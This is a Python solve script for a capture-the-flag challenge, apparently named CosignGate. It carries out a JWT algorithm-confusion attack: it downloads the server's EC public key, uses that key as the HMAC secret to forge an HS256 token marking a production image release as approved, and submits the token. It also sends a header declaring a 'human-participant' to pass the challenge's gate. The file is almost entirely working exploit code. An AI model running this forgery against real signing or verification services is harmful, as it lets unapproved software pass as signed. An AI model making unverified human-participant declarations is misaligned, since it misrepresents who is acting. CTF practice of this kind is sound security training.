#!/usr/bin/env python3
"""
CosignGate (91.99.207.116:16363) solve script.

JWT algorithm-confusion attack: the server's /keys/cosign.pub (an EC public
key) is reused as the HMAC secret when a client submits an HS256-signed
token, even though the key is meant to be used only for asymmetric (ES256)
verification. Forge an HS256 token using the public key's own bytes as the
secret.

Run:
  python3 -m pip install --target=./pylibs requests
  PYTHONPATH=./pylibs python3 solve.py
"""
import json
import base64
import hmac
import hashlib
import requests

BASE = "http://91.99.207.116:16363"
HEADERS = {"X-CTF-Acknowledgement": "human-participant"}


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def make_hs256(payload: dict, secret: bytes) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url(sig)}"


def main():
    s = requests.Session()
    s.post(f"{BASE}/api/acknowledge")  # unlocks ctf_ack cookie gate

    pub = s.get(f"{BASE}/keys/cosign.pub", headers=HEADERS).content

    payload = {"repo": "corp/production-image", "release": "approved"}
    token = make_hs256(payload, pub)

    r = s.post(f"{BASE}/api/v1/verify", data={"token": token}, headers=HEADERS)
    print(r.status_code, r.text)


if __name__ == "__main__":
    main()
